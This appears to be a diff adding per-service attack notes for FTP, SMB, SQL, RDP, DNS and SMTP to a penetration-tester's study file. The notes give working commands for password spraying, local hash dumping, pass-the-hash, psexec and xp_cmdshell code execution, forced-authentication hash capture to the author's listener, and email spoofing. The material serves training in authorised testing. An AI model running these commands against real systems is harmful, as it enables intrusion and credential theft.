@@ -35,7 +35,104 @@ Everything is loot: usernames, emails, passwords, DNS records, IPs, source code,
 > Through-line of the module: every piece of info is valuable, misconfigs leak info and sometimes give RCE, and automation speeds the hunt. SPPD is the lens for *why* an attack works, not just *that* it does.
 
 ## Per-service attacks
-(FTP, SMB, SQL, RDP, DNS, SMTP — filled as I send those sections.)
+
+### FTP (TCP/21)
+```bash
+nmap -sC -sV -p21 <HOST>              # ftp-anon script checks anonymous login
+ftp <HOST>                            # anonymous / anonymous (blank pw)
+nc <HOST> 21                          # banner
+medusa -u <user> -P <list> -h <HOST> -M ftp     # brute (spraying usually better)
+```
+- **Anonymous access** → read/upload sensitive files.
+- **FTP bounce** (misconfig): use the FTP server to scan internal hosts — `nmap -Pn -b anonymous:pass@<FTP> <internal_target>`.
+- **CVE-2022-22836 (CoreFTP)** — authenticated path traversal / arbitrary file write via HTTP PUT with `../`.
+- Post-login: `ls cd get mget put mput`. Secure variants: SFTP, FTPS. Servers: vsftpd, proftpd.
+
+### SMB (TCP/445, 139 + UDP/137-138)
+```bash
+nmap -sV -sC -p139,445 <HOST>
+smbclient -N -L //<HOST>              # null session: list shares
+smbmap -H <HOST>                      # shares + perms
+rpcclient -U '%' <HOST>               # RPC enum
+enum4linux-ng.py -A -C <HOST>         # comprehensive
+```
+**Attacks (scope + approval):**
+```bash
+crackmapexec smb <HOST> -u users.txt -p <pass> --local-auth    # spray
+crackmapexec smb <HOST> -u <u> -p <p> --loggedon-users         # who's logged on
+crackmapexec smb <HOST> -u <u> -p <p> --sam                    # dump local hashes
+crackmapexec smb <HOST> -u <u> -H <hash>                       # Pass-the-Hash
+impacket-psexec <u>:<p>@<HOST>                                 # RCE
+crackmapexec smb <HOST> -u <u> -p <p> -x 'whoami'              # run a command
+```
+- **Forced auth / hash capture:** `responder -I <iface>` captures NetNTLMv2 → crack with hashcat `-m 5600` (see module 10) or relay.
+- **CVE-2020-0796 (SMBGhost)** — SMBv3.1.1 compression flaw, unauth RCE on Win10 1903/1909.
+
+### SQL databases — MSSQL (1433/1434), MySQL (3306)
+```bash
+nmap -Pn -sV -sC -p1433 <HOST>
+mysql -u <u> -p<pass> -h <HOST>                 # MySQL
+mssqlclient.py <u>@<HOST> -p 1433               # MSSQL (Impacket)  / sqlcmd / sqsh
+```
+Enumerate: `SHOW DATABASES;` (MySQL) / `SELECT name FROM master.dbo.sysdatabases; GO` (MSSQL), then tables via `INFORMATION_SCHEMA.TABLES`.
+**MSSQL attacks:**
+```sql
+-- command exec (enable first if needed)
+EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; GO
+xp_cmdshell 'whoami'; GO
+-- read local files
+SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS c; GO
+-- capture the service NetNTLM hash to my SMB listener
+EXEC master..xp_dirtree '\\<MY_IP>\share\'; GO     -- catch with responder / impacket-smbserver
+-- impersonation + linked servers
+EXECUTE AS LOGIN='<user>'; ... REVERT; GO
+SELECT srvname,isremote FROM sysservers; GO
+EXECUTE('<query>') AT [<linked_server>]; GO
+```
+**MySQL:** `LOAD_FILE('<path>')` reads files; `INTO OUTFILE '<webroot>/x.php'` **writes** files — writing a PHP file to the webroot = RCE (I don't store the shell payload; note the technique). FILE privilege + known webroot required.
+
+### RDP (TCP/3389)
+```bash
+nmap -Pn -p3389 <HOST>
+crowbar -b rdp -s <HOST>/32 -U users.txt -c <pass>     # spray
+hydra -L users.txt -p <pass> <HOST> rdp
+xfreerdp /v:<HOST> /u:<u> /p:<p>        # login  (rdesktop also)
+xfreerdp /v:<HOST> /u:<u> /pth:<NT_hash>               # Pass-the-Hash (needs Restricted Admin)
+```
+- **Session hijacking** (SYSTEM): `tscon <session_id> /dest:<our_session>` via a service — documented technique, note it for the report.
+- **CVE-2019-0708 (BlueKeep)** — pre-auth UAF RCE on older Windows; unstable (can BSoD).
+
+### DNS (UDP/53, TCP/53)
+```bash
+nmap -p53 -Pn -sV -sC <HOST>
+dig AXFR @<nameserver> <domain>         # zone transfer (misconfig = full records)
+fierce --domain <domain>
+subfinder -d <domain> -v                # subdomain enum (also sublist3r, subbrute)
+host <sub> ; nslookup <sub>             # CNAME checks
+```
+- **Subdomain takeover:** dangling CNAME → expired third-party service (S3 "NoSuchBucket" etc.); verify with *can-i-take-over-xyz*. Impact: phishing, cookie theft, CORS/CSP abuse.
+- **Cache poisoning / spoofing:** MITM with Ettercap/Bettercap (`etter.dns` + `dns_spoof`).
+
+### SMTP / email (25, 465, 587; POP3 110/995; IMAP 143/993)
+```bash
+nmap -Pn -sV -sC -p25,110,143,465,587,993,995 <HOST>
+host -t MX <domain> ; dig mx <domain>        # mail servers
+dig txt <domain>                             # SPF/DKIM/DMARC
+```
+**User enum & attacks:**
+```bash
+# SMTP verbs: VRFY <user> / EXPN <list> / RCPT TO <user>
+smtp-user-enum -M VRFY -U users.txt -D <domain> -t <HOST>
+nmap -p25 -Pn --script smtp-open-relay <HOST>        # open relay
+swaks --from a@x --to b@y --server <HOST>            # send test / relay check
+hydra -L users.txt -P pass.txt <HOST> smtp
+# cloud: o365spray / MailSniper (Office365), enum_google (Workspace)
+```
+- **Spoofing** via manual `telnet <HOST> 25` (HELO/MAIL FROM/RCPT TO/DATA) when no SPF/DKIM/DMARC.
+- **CVE-2020-7247 (OpenSMTPD)** unauth RCE; **CVE-2021-27211 (Exim)**. OSINT: theHarvester, Shodan, Censys, Amass.
+
+> Across all six: enumerate → check anon/null/default access → spray (not brute) → abuse the service's own features (xp_cmdshell, OUTFILE, zone transfer, open relay) → capture/relay hashes. SPPD explains each.
 
 ## My notes / lab output
 Filled in as I run these on lab targets.
